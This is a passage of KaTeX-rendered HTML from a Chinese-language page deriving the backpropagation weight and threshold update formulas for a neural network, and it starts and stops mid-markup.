class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>最终推得： <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>w</mi><msub><mi>h</mi><mi>j</mi></msub></msub><mo>=</mo><mi>η</mi><msub><mi>g</mi><mi>j</mi></msub><msub><mi>b</mi><mi>h</mi></msub></mrow><annotation encoding="application/x-tex">\triangle{w_{h_j}}=\eta g_jb_h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04176em;vertical-align:-0.34731999999999996em;"></span><span class="mord">△</span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.34731999999999996em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>其他参数的推导式同样的方法：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>θ</mi><mi>j</mi></msub><mo>=</mo><mo>−</mo><mi>η</mi><msub><mi>g</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\triangle{\theta_j}=-\eta g_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord">△</span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>v</mi><mrow><mi>i</mi><mi>h</mi></mrow></msub><mo>=</mo><mi>η</mi><msub><mi>e</mi><mi>h</mi></msub><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\triangle{v_{ih}}=\eta e_hx_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>γ</mi><mi>h</mi></msub><mo>=</mo><mo>−</mo><mi>η</mi><msub><mi>e</mi><mi>h</mi></msub></mrow><annotation encoding="application/x-tex">\triangle\gamma_h=-\eta e_h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。其中：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>h</mi></msub><mo>=</mo><mo>−</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>E</mi><mi>k</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>b</mi><mi>h</mi></msub></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>b</mi><mi>h</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>a</mi><mi>h</mi></msub></mrow></mfrac><mo>=</mo><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>l</mi></msubsup><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>E</mi><mi>k</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>β</mi><mi>j</mi></msub></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>β</mi><mi>j</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>b</mi><mi>h</mi></msub></mrow></mfrac><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>−</mo><msub><mi>γ</mi><mi>h</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>l</mi></msubsup><mrow><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub><msub><mi>g</mi><mi>j</mi></msub><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>−</mo><msub><mi>γ</mi><mi>h</mi></msub><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi><mo>=</mo><msub><mi>b</mi><mi>h</mi></msub><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mi>b</mi><mi>h</mi></msub><mo stretchy="false">)</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>l</mi></msubsup><mrow><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub><msub><mi>g</mi><mi>j</mi></msub></mrow></mrow><annotation encoding="application/x-tex">e_h=-\frac{\partial E_k}{\partial b_h} \cdot \frac{\partial b_h}{\partial a_h}=-\sum^{l}_{j=1}\frac{\partial E_k}{\partial \beta_j}\cdot\frac{\partial \beta_j}{\partial b_h}f&#x27;(a_h-\gamma_h)=\sum^{l}_{j=1}{w_{hj}g_jf&#x27;(a_h-\gamma_h)}|=b_h(1-b_h)\sum^{l}_{j=1}{w_{hj}g_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3528279999999997em;vertical-align:-0.4508599999999999em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4508599999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.3528279999999997em;vertical-align:-0.4508599999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4508599999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.5313279999999998em;vertical-align:-0.5423199999999999em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.4442879999999998em;vertical-align:-0.4508599999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.993428em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4508599999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.424826em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 